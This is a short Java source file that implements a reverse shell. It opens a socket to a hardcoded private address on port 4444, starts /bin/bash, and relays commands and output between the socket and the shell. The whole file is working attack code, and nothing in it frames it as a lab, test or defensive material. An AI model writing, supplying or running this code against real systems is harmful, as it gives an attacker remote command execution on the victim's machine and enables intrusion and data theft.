import java.io.*;
import java.net.*;

public class ReverseShell {
    public static void main(String[] args) {
        String host = "192.168.29.146";
        int port = 4444;
        try {
            Socket socket = new Socket(host, port);
            Process process = Runtime.getRuntime().exec("/bin/bash");
            InputStream processInput = process.getInputStream();
            OutputStream processOutput = process.getOutputStream();
            new Thread(() -> {
                try {
                    byte[] buffer = new byte[1024];
                    int bytesRead;
                    while ((bytesRead = processInput.read(buffer)) != -1) {
                        socket.getOutputStream().write(buffer, 0, bytesRead);
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }).start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                processOutput.write((line + "\n").getBytes());
                processOutput.flush();
            }
            socket.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
